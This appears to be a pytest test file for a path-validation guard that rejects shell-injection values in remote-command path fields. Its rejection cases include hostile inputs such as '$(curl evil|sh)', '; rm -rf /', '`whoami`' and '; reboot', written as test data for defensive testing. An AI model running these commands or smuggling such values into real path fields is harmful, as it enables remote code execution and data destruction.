"""pathsafe — the shell-inertness guard for remote-command path fields."""
import pytest

from gateway.pathsafe import is_safe_path, validate_path_field


@pytest.mark.parametrize("value", [
    "/share/venv",
    "~/work/dir",
    "relative/path",
    "/share/model-v2.1_final",
    "/a/b/c@d+e=f",
])
def test_safe_paths_accepted(value):
    assert is_safe_path(value)
    assert validate_path_field(value, "venv_path") == value


@pytest.mark.parametrize("value", [
    "/share/$(curl evil|sh)",       # the historical RCE shape
    "/tmp/a; rm -rf /",
    "/tmp/a b",                      # whitespace
    "`whoami`",
    "/tmp/$HOME",
    "a\nb",
    "/tmp/'quoted'",
    '/tmp/"quoted"',
    "/tmp/a&b",
    "/tmp/a>b",
    "",
])
def test_unsafe_paths_rejected(value):
    assert not is_safe_path(value)


@pytest.mark.parametrize("value", ["", None, "   "])
def test_blank_and_none_pass_through(value):
    # Blank means "use the default" — callers handle it downstream.
    assert validate_path_field(value, "work_dir") == value


def test_validate_raises_with_field_name():
    with pytest.raises(ValueError, match="work_dir"):
        validate_path_field("/tmp/x; reboot", "work_dir")
